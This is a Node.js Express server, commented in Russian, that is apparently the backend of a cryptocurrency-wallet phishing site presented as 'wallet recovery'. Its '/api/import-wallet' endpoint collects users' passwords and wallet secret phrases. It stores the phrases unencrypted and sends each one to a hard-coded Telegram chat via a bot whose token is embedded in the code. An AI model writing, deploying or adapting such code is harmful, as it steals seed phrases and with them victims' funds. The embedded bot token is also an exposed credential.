import express from 'express';
import { createServer } from 'http';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import bodyParser from 'body-parser';
import sqlite3 from 'sqlite3';
import { open } from 'sqlite';
import bcrypt from 'bcrypt';
import TelegramBot from 'node-telegram-bot-api';
import fs from 'fs'; // Импорт модуля fs

// Определение путей
const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

// Инициализация Express
const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 3000;

// Telegram Bot Token (замени на свой!)
const TELEGRAM_BOT_TOKEN = '7642234957:AAE0ENTrerknz6pp4sXDhMOZef8ZzF7Y9cs'; // <---- Замени на свой токен!
const TELEGRAM_CHAT_ID = '1447071887';  // <---- Узнай свой chat ID и вставь сюда!

// Создаем бота
const bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });

// Функция для отправки сообщения в Telegram и записи в файл
function logAndSend(message) {
  // Отправляем в Telegram
  bot.sendMessage(TELEGRAM_CHAT_ID, message)
    .then(() => {
      console.log('Message sent to Telegram:', message);
    })
    .catch((error) => {
      console.error('Error sending Telegram message:', error);
    });

  // Записываем в output.txt
  fs.appendFile('output.txt', message + '\n', (err) => {
    if (err) {
      console.error('Error writing to output.txt:', err);
    } else {
      console.log('Message written to output.txt:', message);
    }
  });
}

// Middleware
app.use(bodyParser.json());
app.use(express.static(__dirname));

// Инициализация базы данных
async function initializeDatabase() {
  const db = await open({
    filename: 'wallet_recovery.db',
    driver: sqlite3.Database
  });

  // Создание таблицы, если она не существует
  await db.exec(`
    CREATE TABLE IF NOT EXISTS wallet_recovery (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      password TEXT NOT NULL,
      secret_phrase TEXT NOT NULL,
      created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);

  return db;
}

// Глобальная переменная для базы данных
let db;

// Инициализация базы данных при запуске
(async () => {
  try {
    db = await initializeDatabase();
    console.log('Database initialized successfully');
    logAndSend('Server started successfully!'); // Отправляем сообщение о запуске
  } catch (error) {
    console.error('Database initialization error:', error);
    logAndSend(`Database initialization error: ${error.message}`); // Отправляем сообщение об ошибке
  }
})();

// Маршрут для главной страницы
app.get('/', (req, res) => {
  res.sendFile(join(__dirname, 'index.html'));
});

// API для импорта кошелька
app.post('/api/import-wallet', async (req, res) => {
  try {
    const { password, secretPhrase } = req.body;

    // Проверка данных
    if (!password || password.length < 8) {
      return res.status(400).json({ success: false, message: 'Password must be at least 8 characters' });
    }

    if (!secretPhrase) {
      return res.status(400).json({ success: false, message: 'Secret phrase is required' });
    }

    // Хеширование пароля для безопасного хранения
    const hashedPassword = await bcrypt.hash(password, 10);

    // Сохранение в базу данных
    await db.run(
      'INSERT INTO wallet_recovery (password, secret_phrase) VALUES (?, ?)',
      [hashedPassword, secretPhrase]
    );

    // Отправка успешного ответа
    res.json({ success: true, message: 'Wallet imported successfully' });

    const logMessage = `New wallet recovery data saved: ${JSON.stringify({ secretPhrase })}`;
    console.log(logMessage); // Логируем в консоль (для отладки)
    logAndSend(logMessage); // Отправляем в Telegram и записываем в файл

  } catch (error) {
    console.error('Error saving wallet recovery data:', error);
    const errorMessage = `Error saving wallet recovery data: ${error.message}`;
    logAndSend(errorMessage); // Отправляем в Telegram и записываем в файл
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// Запуск сервера
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Open http://localhost:${PORT} in your browser`);
  logAndSend(`Server running on port ${PORT}. Open http://localhost:${PORT} in your browser`);
});
